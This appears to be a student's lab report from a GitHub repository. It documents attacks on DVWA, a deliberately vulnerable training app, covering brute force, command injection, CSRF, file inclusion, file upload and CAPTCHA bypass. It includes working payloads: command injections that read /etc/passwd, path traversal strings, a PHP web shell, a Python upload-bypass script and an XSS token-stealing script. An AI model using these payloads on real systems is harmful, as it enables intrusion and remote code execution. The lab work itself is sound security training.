# Application-Security-Testing-DVWA

# DVWA Security Lab Report

Vulnerability Testing
## 1. Brute Force

### Security Level: Low

Payload Used: Burp Suite Intruder Attack

Result: Multiple attempts were made to log in based on the password list I had provided, a few lengths were different indicating they were correct password matches.

Screenshot:
<img width="1818" height="857" alt="Attack Result" src="https://github.com/user-attachments/assets/6a43b826-facc-42ce-bd2c-cb0cb6f72cb8" />


Explanation of why it worked: There is no limit to the number of log in attempts I can make, hence I can simply brute force every common password possible. Especially since the passwords are not complicated.

### Security Level: Medium

Payload Used: Burp Suite Intruder Attack

Result: Multiple attempts were made to log in again based on the same password list, once more the correct password was found.

Screenshot:
<img width="1810" height="811" alt="Brute Med" src="https://github.com/user-attachments/assets/81aec2a7-f268-42be-9822-6ad1a4f70fb9" />


Explanation of why it worked: Because the medium security only has a 2 second gap between attempts, brute force is still possible as there is only a minor delay between password attempts.

### Security Level: High

Payload Used: Burp Suite Intruder Attack

Result: Multiple attempts were made to log in, this time with a token being generated and Recursive GERP being utilised. Once more, the correct password and token combination was found.

Screenshot:
<img width="1803" height="752" alt="Brute High" src="https://github.com/user-attachments/assets/80df1b5d-3f4e-4dfa-a29f-6393c317cc4a" />


Explanation of why it failed/worked: There is a CSRF token being used on this level, where on every page refresh a new token is generated. In order to do this, I had to not only brute force the passwords but extract the token for each refresh as well. Successfully doing this allowed me to figure out the password.

Security Level Comparison
At Low security, there were no protection measures so it was a trivial case of trying multiple passwords. At medium difficulty there was only a short delay but it was still easy. At high difficulty it was more complicated where I had to extract the token as well to find out the password.

## 2. Command Injection

### Security Level: Low

Payload Used: Browser itself, 127.0.0.1; cat /etc/passwd

Result: Entire list of user accounts on linux server dumped on screen.

Screenshot:
<img width="825" height="672" alt="Command Injection Low" src="https://github.com/user-attachments/assets/b7f25029-1f2d-46d7-b04f-0374db2b0d23" />



Explanation of why it worked: On the lowest level the system executes whatever command is inputted directly into power shell. Because there is no sanitation, a person can use operators like semi colons to execute any commands they want directly.

### Security Level: Medium

Payload Used: Browser itself, 127.0.0.1 | cat /etc/password

Result: Entire list of user accounts on linux server dumped on screen.

Screenshot:
<img width="827" height="527" alt="Command Injection Medium" src="https://github.com/user-attachments/assets/0d2f9f11-7127-4090-b989-69c201d788ad" />




Explanation of why it worked: On the medium level, the developer has put blacklists of operators like semi colon but the issue is he overlooked others such as | so they can still be exploited.

### Security Level: High

Payload Used: Browser itself, 127.0.0.1|cat /etc/password

Result: Entire list of user accounts on linux server dumped on screen.

Screenshot:
<img width="822" height="512" alt="Command Injection High" src="https://github.com/user-attachments/assets/3a3e72f6-3153-4822-8544-82d8f1a434d7" />





Explanation of why it worked: The developer has done a great job making a proper blacklist, but he made a typo in the blacklist where he added a trailing space. Meaning if I just change the commands spaces to exploit this, I easily got past it.

## 3. CSRF

### Security Level: Low

Payload Used: External HTML link. http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change

Result: Password for the website was changed successfully upon clicking the link given in the html.

Screenshot:
<img width="1918" height="913" alt="CSRF low level" src="https://github.com/user-attachments/assets/5f73240e-b0d0-472e-8f04-1f2ee78dc777" />





Explanation of why it worked: I created an external html which when you open, it takes advantage of the fact that the low level security threat uses a simple HTTP GET request, all new paramters are being passed directly into the URL. Hence inside this external html, once they click on the link, it loads a change password cross attack which overrides the websites password.

### Security Level: Medium

Payload Used: External HTML link. Referer: http://127.0.0.1.hacker.com/evil.html

Result: Password for the website was changed successfully after the new url was used.

Screenshot:
<img width="1471" height="377" alt="CSRF Medium level" src="https://github.com/user-attachments/assets/0415dc62-c4ed-48fb-bcb7-c80958a6386b" />






Explanation of why it worked: The security check is broken, the developer isn't checking if the referer being used for the URL exactly matches, they are simply checking if 127.0.0.1 is anywhere in the line. Hence as long as the URL for the evil.html file contains 127.0.0.1 anywhere, it still goes through and the same exploit for changing password works.

### Security Level: High

Payload Used: Chained attack, uses inbuilt XSS Stored module to bypass CSRF protection
```html
  <script>
  var req = new XMLHttpRequest();
  req.onload = function() {
      var token = this.responseText.match(/user_token\' value=\'(.*?)\'/)[1];
      var attack = new XMLHttpRequest();
      attack.open("GET", "[http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=](http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=)" + token, true);
      attack.send();
  };
  req.open("GET", "[http://127.0.0.1:8080/vulnerabilities/csrf/](http://127.0.0.1:8080/vulnerabilities/csrf/)", false);
  req.send();
  </script>
```

Result: Password for the website was changed successfully.

Screenshot:
<img width="1195" height="906" alt="CSRF High level" src="https://github.com/user-attachments/assets/a384cb21-64c1-403e-9cf4-146ae844017f" />





Explanation of why it worked: There is an anti-CRF token (user token) that is being validated on the server, which external attacks like we used cannot read. But now we bypass this because we used stored XSS vulnerability on the same trusted origin. Because we run this javascript directly in the application, the code is executing within the trusted origin, bypassing the SOP thus executing the request.

## 4. File Inclusion

### Security Level: Low

Payload Used: ?page=../../../../../../etc/passwd

Result: The website outputted the entire linux user depository on the top of the screen.

Screenshot:
<img width="1901" height="908" alt="File Inclusion Low" src="https://github.com/user-attachments/assets/b31de28c-e58c-4390-a12b-eb22da0c99f9" />






Explanation of why it worked: At this security level, the website is simply taking whatever page is inputted into the URL and passes it directly into the code. Using a trick known as path traversal, we can then execute any command in the terminal and exploit this vulnerability.

### Security Level: Medium

Payload Used: ?page=....//....//....//....//....//....//etc/passwd

Result: The website outputted the entire linux user depository on the top of the screen.

Screenshot:
<img width="1898" height="911" alt="File Inclusion Medium" src="https://github.com/user-attachments/assets/4f5006df-204b-4ff0-800d-28f32d4d42f9" />







Explanation of why it worked: At this security level, the security level is checking for strings such as "../" however there is a fatal flaw, that it only checks once. Meaning if I simply embed and repeat the ../ twice it will not be filtered and the command will still work as intended.

### Security Level: High

Payload Used: ?page=file:///etc/passwd

Result: The website outputted the entire linux user depository on the top of the screen.

Screenshot:
<img width="1886" height="962" alt="File Inclusion High" src="https://github.com/user-attachments/assets/746a8d33-62a8-407c-ae69-66ac5646186d" />








Explanation of why it worked: At this security level, the security level is moving away from a blacklist to a white list where it's only allowing certain strings. However there is a loophole as PHP has built-in protocols, one being the file:// protocol, which goes right through the whitelist and in turn still fetches the path etc/passwd and dumps the information.

## 5. File Upload

### Security Level: Low

Payload Used: File uploaded containing the command <?php system($_GET['cmd']); ?>

Result: The URL can now be used to execute commands such as ls and achieve full remote code execution.

Screenshot:
<img width="1913" height="963" alt="File Upload Low" src="https://github.com/user-attachments/assets/894063e5-3837-46fa-8c83-5892130fbaeb" />







Explanation of why it worked: In this security level, the website simply allows for any file to be uploaded without checking for file extensions. As a result, because the web server is designed to execute php files, we can simply run php code directly on the server.

### Security Level: Medium

Payload Used: File uploaded containing a script:
```import requests

# 1. The target URL in your local Docker container
url = "http://127.0.0.1:8080/vulnerabilities/upload/"

# 2. Your active browser session
cookies = {
    "PHPSESSID": "aomhsi8s8787jjtg2ov753itu4", 
    "security": "medium"
}

# 3. The Web Shell Payload
shell_code = "<?php system($_GET['cmd']); ?>"

# 4. The Bypass: Forging the Request
# We tell Python to upload a file named 'shell.php', containing our code,
# but we explicitly tell the server the MIME type is 'image/jpeg'.
files = {
    'uploaded': ('shell.php', shell_code, 'image/jpeg')
}

# The form also requires the Upload button to be "clicked"
data = {
    'Upload': 'Upload'
}

# 5. Fire the Request
print("[*] Sending spoofed HTTP request...")
response = requests.post(url, files=files, data=data, cookies=cookies)

# 6. Check the Results
if "successfully uploaded" in response.text:
    print("[+] Bypass Successful!")
    print("[+] The server accepted the .php file because the header said it was an image.")
    print("[+] Execute commands here: http://127.0.0.1:8080/hackable/uploads/shell.php?cmd=whoami")
else:
    print("[-] Upload failed. Double-check your PHPSESSID cookie and ensure DVWA is set to Medium.")
```

Result: Successfully bypassed the file type filter, uploaded the PHP web shell, and achieved Remote Code Execution.

Screenshot:
<img width="1918" height="962" alt="File Upload Medium" src="https://github.com/user-attachments/assets/2ce5282e-5d1c-4140-b8db-0dc2e63f9acf" />








Explanation of why it worked: The Medium security level attempts to restrict uploads by verifying the Content-Type header provided by the client (e.g., ensuring it is image/jpeg or image/png). However, it relies entirely on user-controllable input without validating the actual file contents or extension on the server side. By writing a Python script to construct the HTTP POST request, the Content-Type header can be manually spoofed to an accepted MIME type, tricking the application into storing the executable PHP script.


### Security Level: High

Payload Used: A polyglot payload disguising PHP code inside an image file structure: GIF89a; <?php system($_GET['cmd']); ?>, saved as hacked.jpg. 

Result: Successfully bypassed strict file extension and content-signature validation to upload a malicious payload, and achieved Remote Code Execution by utilizing the LFI vulnerability to execute the injected code.

Screenshot:
<img width="1900" height="962" alt="File Upload High" src="https://github.com/user-attachments/assets/358e4f2a-642e-4ecc-afe9-80df8e460433" />
<img width="1897" height="697" alt="File Upload High 2" src="https://github.com/user-attachments/assets/e2d987e2-c97c-4d21-9cc7-e50f4007bcbd" />









Explanation of why it worked: The validation was bypassed by forging a file header. The string GIF89a; acts as a valid magic byte signature for a GIF, satisfying the getimagesize() check, while the .jpg extension bypasses the name filter. Because the web server will not natively execute a .jpg file as PHP, the attack requires chaining with a Local File Inclusion vulnerability. The include()  function in PHP evaluates any PHP tags present within the included file, regardless of its extension, allowing the embedded web shell to execute and process arbitrary operating system commands.

## 6. Insecure CAPTCHA

### Security Level: Low

Payload Used: Simply edited the HTML of the page to change `<input type="hidden" name="step" value="2">` value from 1 to 2.

Result: The website genuinely believed the page form was now on step 2, and the password was changed bypassing the CAPTCHA.

Screenshot:
<img width="1597" height="902" alt="Captcha Low" src="https://github.com/user-attachments/assets/b1ccfc1b-a88f-4a38-bf4a-e6389b832d6c" />

### Security Level: Medium

Payload Used: Simply edited the HTML of the page to change `<input type="hidden" name="step" value="2">` value from 1 to 2. And inserted new line below it with `<input type="hidden" name="passed_captcha" value="true">`

Result: The website genuinely changed the password believing the captcha was verified.

Screenshot:
<img width="1777" height="967" alt="Insecure Captcha Medium" src="https://github.com/user-attachments/assets/6ad4f88d-933e-4a68-8d98-2049b79f2e14" />

### Security Level: High

Payload Used: Utilized browser Developer Tools (Network Conditions) to override the User-Agent header to reCAPTCHA, and manipulated the DOM to inject the hidden parameter `<input type="hidden" name="g-recaptcha-response" value="hidd3n_valu3">`.

Result: The website genuinely changed the password believing the captcha was verified.

Screenshot:
<img width="1760" height="952" alt="Insecure Captcha High" src="https://github.com/user-attachments/assets/8a917bf4-9f8b-4a0d-b065-94e6c20f9de5" />












Explanation of why it worked: The PHP source code contains a fallback condition that grants authorization if the g-recaptcha-response parameter exactly matches hidd3n_valu3 and the HTTP User-Agent header matches reCAPTCHA. By using browser developer tools to manually spoof the header and inject the required form data, an attacker can trivially bypass the intended CAPTCHA enforcement without needing an external proxy.
